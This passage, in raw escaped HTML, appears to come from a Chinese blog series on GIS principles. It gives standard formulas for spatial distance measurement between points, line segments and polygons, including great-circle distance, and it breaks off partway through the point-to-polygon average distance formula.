face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;讲述空间分析模型的概念、GIS常用的空间统计分析模型、对应的详细算法及模型库。&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;&lt;font size=&quot;4&quot;&gt;&lt;font color=&quot;#ff0000&quot;&gt;您可能还想看前贴&lt;font color=&quot;#000000&quot;&gt;【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（一）&quot; href=&quot;http://space.cnblogs.com/group/topic/3035/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot; face=&quot;宋体&quot;&gt;&lt;strong&gt;GIS原理学习（一）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot; face=&quot;宋体&quot;&gt;&lt;strong&gt;】【&lt;/strong&gt;&lt;/font&gt;&lt;a title=&quot;GIS原理学习（二）&quot; href=&quot;http://space.cnblogs.com/group/topic/3082/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot; face=&quot;宋体&quot;&gt;&lt;strong&gt;GIS原理学习（二）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;font face=&quot;宋体&quot;&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（三）&quot; href=&quot;http://space.cnblogs.com/group/topic/3098/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot;&gt;&lt;strong&gt;GIS原理学习（三）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a class=&quot;&quot; title=&quot;GIS原理学习（四）&quot; href=&quot;http://space.cnblogs.com/group/topic/3127/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（四）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（五）&quot; href=&quot;http://space.cnblogs.com/group/topic/3143/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（五）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（六）&quot; href=&quot;http://space.cnblogs.com/group/topic/3151/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（六）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（七）&quot; href=&quot;http://space.cnblogs.com/group/topic/3156/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（七）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（八）&quot; href=&quot;http://space.cnblogs.com/group/topic/3166/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（八）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（九）&quot; href=&quot;http://space.cnblogs.com/group/topic/3185/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（九）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十）&quot; href=&quot;http://space.cnblogs.com/group/topic/3197/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#810081&quot;&gt;&lt;strong&gt;GIS原理学习（十）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十一）&quot; href=&quot;http://space.cnblogs.com/group/topic/3208/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot;&gt;&lt;strong&gt;GIS原理学习（十一）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十二）&quot; href=&quot;http://space.cnblogs.com/group/topic/3247/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（十二）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十三）&quot; href=&quot;http://space.cnblogs.com/group/topic/3254/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;&lt;strong&gt;GIS原理学习（十三）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十四）&quot; href=&quot;http://space.cnblogs.com/group/topic/3283/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot;&gt;&lt;strong&gt;GIS原理学习（十四）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十五）&quot; href=&quot;http://space.cnblogs.com/group/topic/3299/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot;&gt;&lt;strong&gt;GIS原理学习（十五）&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;/strong&gt;&lt;a title=&quot;GIS原理学习（十六）&quot; href=&quot;http://space.cnblogs.com/group/topic/3306/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;GIS原理学习（十六）&lt;/font&gt;&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（十七）&quot; href=&quot;http://space.cnblogs.com/group/topic/3323/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;GIS原理学习（十七）&lt;/font&gt;&lt;/a&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（十八）&quot; href=&quot;http://space.cnblogs.com/group/topic/3336/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#075db3&quot;&gt;GIS原理学习（十八）&lt;/font&gt;&lt;/a&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（十九）&quot; href=&quot;http://space.cnblogs.com/group/topic/3349/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;GIS原理学习（十九）&lt;/font&gt;&lt;/a&gt;&lt;font size=&quot;4&quot; color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（二十）&quot; href=&quot;http://space.cnblogs.com/group/topic/3362/&quot; target=&quot;_blank&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000ff&quot;&gt;GIS原理学习（二十）&lt;/font&gt;&lt;/a&gt;&lt;font size=&quot;4&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;】【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（二十一）&quot; href=&quot;http://space.cnblogs.com/group/topic/3382/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;GIS原理学习（二十一）&lt;/font&gt;&lt;/a&gt;&lt;font color=&quot;#000000&quot;&gt;】&lt;/font&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;font face=&quot;宋体&quot;&gt;&lt;strong&gt;&lt;font size=&quot;4&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;【&lt;/font&gt;&lt;a class=&quot;&quot; title=&quot;GIS原理学习（二十二）&quot; href=&quot;http://space.cnblogs.com/group/topic/3390/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#810081&quot;&gt;GIS原理学习（二十二）&lt;/font&gt;&lt;/a&gt;&lt;font color=&quot;#000000&quot;&gt;】&lt;/font&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;font size=&quot;4&quot;&gt;&lt;font face=&quot;宋体&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（二十三）&quot; href=&quot;http://space.cnblogs.com/group/topic/3398/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#075db3&quot;&gt;GIS原理学习（二十三）&lt;/font&gt;&lt;/a&gt;&lt;font color=&quot;#000000&quot;&gt;】&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;/font&gt;&lt;font size=&quot;4&quot;&gt;&lt;font face=&quot;宋体&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;【&lt;/font&gt;&lt;a title=&quot;GIS原理学习（二十四）&quot; href=&quot;http://space.cnblogs.com/group/topic/3412/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#075db3&quot;&gt;GIS原理学习（二十四）&lt;/font&gt;&lt;/a&gt;&lt;font color=&quot;#000000&quot;&gt;】&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/strong&gt;&lt;strong&gt;&lt;font size=&quot;4&quot;&gt;&lt;font face=&quot;宋体&quot;&gt;【&lt;a title=&quot;GIS原理学习（二十五）&quot; href=&quot;http://space.cnblogs.com/group/topic/3418/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#075db3&quot;&gt;GIS原理学习（二十五）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（二十六）&quot; href=&quot;http://space.cnblogs.com/group/topic/3430/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;GIS原理学习（二十六）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（二十七）&quot; href=&quot;http://space.cnblogs.com/group/topic/3444/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#075db3&quot;&gt;GIS原理学习（二十七）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（二十八）&quot; href=&quot;http://space.cnblogs.com/group/topic/3461/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;GIS原理学习（二十八）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（二十九）&quot; href=&quot;http://space.cnblogs.com/group/topic/3468/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#075db3&quot;&gt;GIS原理学习（二十九）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（三十）&quot; href=&quot;http://space.cnblogs.com/group/topic/3485/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;GIS原理学习（三十）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（三十一）&quot; href=&quot;http://space.cnblogs.com/group/topic/3497/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;GIS原理学习（三十一）&lt;/font&gt;&lt;/a&gt;】【&lt;a title=&quot;GIS原理学习（三十二）&quot; href=&quot;http://space.cnblogs.com/group/topic/3505/&quot; target=&quot;_blank&quot;&gt;GIS原理学习（三十二）&lt;/a&gt;】&lt;/font&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot; color=&quot;#000099&quot; face=&quot;华文新魏&quot;&gt;§5.8 空间距离量算&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;距离量算是各种GIS空间分析的定量基础，根据地理实体类型的不同，空间距离量算可分为以下几类：&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;一、点/点距离计算&lt;/font&gt;&lt;/i&gt;&lt;/h3&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(一)、平面距离与角度：描述二维空间中两点的距离和矢量夹角。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;设有平面上的两点P&lt;sub&gt;1&lt;/sub&gt;(x&lt;sub&gt;1&lt;/sub&gt;,y&lt;sub&gt;1&lt;/sub&gt;)与P&lt;sub&gt;2&lt;/sub&gt;(x&lt;sub&gt;2&lt;/sub&gt;,y&lt;sub&gt;2&lt;/sub&gt;)，则两点之间的平面距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:center;&quot; align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;|P&lt;sub&gt;1&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt;|= &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.1.75.gif&quot; height=&quot;27&quot; width=&quot;121&quot; /&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;矢量P&lt;sub&gt;2&lt;/sub&gt;到P&lt;sub&gt;1&lt;/sub&gt;之间的夹角为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:center;&quot; align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp; &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.1.76.gif&quot; height=&quot;21&quot; width=&quot;240&quot; /&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(二)、空间直线距离：描述三维空间中两个点的直线距离。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;设空间两点为P&lt;sub&gt;1&lt;/sub&gt;(x&lt;sub&gt;1&lt;/sub&gt;,y&lt;sub&gt;1&lt;/sub&gt;,z&lt;sub&gt;1&lt;/sub&gt;)与P&lt;sub&gt;2&lt;/sub&gt;(x&lt;sub&gt;2&lt;/sub&gt;,y&lt;sub&gt;2&lt;/sub&gt;,z&lt;sub&gt;2&lt;/sub&gt;)，则两点之间的空间直线距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21pt;line-height:125%;text-align:center;&quot; align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;|P&lt;sub&gt;1&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt;|= &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.1.77.gif&quot; height=&quot;27&quot; width=&quot;180&quot; /&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(三)、球面距离：描述地球表面上两点间的球面距离。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在航空与航海等情况中，作业范围较大，大圆线则是球面上两点之间的最短距离。给定球面两点A(ψ&lt;sub&gt;1&lt;/sub&gt;, λ&lt;sub&gt;1&lt;/sub&gt;)和B(ψ&lt;sub&gt;2&lt;/sub&gt;,λ&lt;sub&gt;2&lt;/sub&gt;)，如图5-8-1所示，圆弧长为:&lt;/font&gt;&lt;/p&gt;\r\n&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.1.78.gif&quot; border=&quot;0&quot; height=&quot;110&quot; width=&quot;140&quot; /&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;图5-8-1 球面距离&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;Cos(S)=Sinψ&lt;sub&gt;1&lt;/sub&gt;*Sinψ&lt;sub&gt;2&lt;/sub&gt;+Cosψ&lt;sub&gt;1&lt;/sub&gt;*Cosψ&lt;sub&gt;2&lt;/sub&gt;*Cos(λ&lt;sub&gt;2&lt;/sub&gt;-λ&lt;sub&gt;1&lt;/sub&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;S=ArcCos(Sinψ&lt;sub&gt;1&lt;/sub&gt;*Sinψ&lt;sub&gt;2&lt;/sub&gt;+Cosψ&lt;sub&gt;1&lt;/sub&gt;*Cosψ&lt;sub&gt;2&lt;/sub&gt;* Cos(λ&lt;sub&gt;2&lt;/sub&gt;-λ&lt;sub&gt;1&lt;/sub&gt;))&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;两点之间的球面距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; L=R*S*π/180&lt;sup&gt;0&lt;/sup&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;二、点/线距离计算&lt;/font&gt;&lt;/i&gt;&lt;/h3&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(一)、点/线段最短距离：描述点到线段的最短距离。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;如图5-8-2所示，设线段P&lt;sub&gt;1&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt;位于横坐标轴，端点为P&lt;sub&gt;1&lt;/sub&gt;和P&lt;sub&gt;2&lt;/sub&gt;。要计算点p到线段P&lt;sub&gt;1&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt;的距离。&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;通过两端点P&lt;sub&gt;1&lt;/sub&gt;和P&lt;sub&gt;2&lt;/sub&gt;，与线段P&lt;sub&gt;1&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt;垂直的直线将平面区域划分为A&lt;sub&gt;1&lt;/sub&gt;、A&lt;sub&gt;2&lt;/sub&gt;、A&lt;sub&gt;3&lt;/sub&gt;。则点p到线段l的最短距离的计算方法为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.2.79.gif&quot; border=&quot;0&quot; height=&quot;244&quot; width=&quot;242&quot; /&gt; &lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(二)、点/线段垂直距离：描述点到线段所在直线的距离。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;设有A、B两点组成的直线l为ax+by+c=0,则点P（X,Y）到直线l的距离计算式为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; distance(P,l)=|aX+bY+c|/ &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.2.80.gif&quot; height=&quot;24&quot; width=&quot;51&quot; /&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(三)、点/线段平均距离:描述点到线段两个端点距离的平均值。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;点/线段平均距离d(p,l)等于点p与直线段两个端点p&lt;sub&gt;a&lt;/sub&gt;和p&lt;sub&gt;b&lt;/sub&gt;的距离值的平均值。即：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d(p,l)=(d(p,p&lt;sub&gt;a&lt;/sub&gt;)+d(p,p&lt;sub&gt;b&lt;/sub&gt;))/2&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(四)、点/线段最大距离:描述点到线段两个端点距离中的的最大值。(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;点/线段最大距离d&lt;sub&gt;max&lt;/sub&gt;(p,l)等于点p与直线段两个端点p&lt;sub&gt;a&lt;/sub&gt;和p&lt;sub&gt;b&lt;/sub&gt;的距离中的最大者。即：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d&lt;sub&gt;max&lt;/sub&gt;(p,l)=max(d(p,p&lt;sub&gt;a&lt;/sub&gt;),d(p,p&lt;sub&gt;b&lt;/sub&gt;))&amp;nbsp;&lt;br /&gt;\r\n&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;三、点/面距离计算&lt;/font&gt;&lt;/i&gt;&lt;/h3&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(一)、点/面最短距离：描述点到面的最短距离(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;点p到面A&lt;sub&gt;n&lt;/sub&gt;的最短距离肯定在面的边界上，因此点面最短距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d&lt;sub&gt;min&lt;/sub&gt;(p,A&lt;sub&gt;n&lt;/sub&gt;)=min{d&lt;sub&gt;min&lt;/sub&gt;(p,l&lt;sub&gt;i&lt;/sub&gt;),i=1,……,n}&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(二)、点/面最大距离：描述点到面的最大距离(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;点/面最大距离为：&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d&lt;sub&gt;max&lt;/sub&gt;(p,A&lt;sub&gt;n&lt;/sub&gt;)=max{d&lt;sub&gt;max&lt;/sub&gt;(p,l&lt;sub&gt;i&lt;/sub&gt;),i=1,……,n}&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;(三)、点/面平均距离计算：描述点到面的平均距离(&lt;i&gt;&lt;font color=&quot;#0000ff&quot;&gt;公式&lt;/font&gt;&lt;/i&gt;)&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 点到面的平均距离计算比较复杂，Atsuyuki Okabe，Harvey H.Miller（1996）将多边形划分为三角形，按照下式计算点到面的平均距离。&lt;/font&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;img src=&quot;http://web.nuist.edu.cn/courses/dlxxxt/ch5/Images/5.8.3.82.gif&quot; height=&quot;57&quot; width=&quot;203&quot; /&gt; 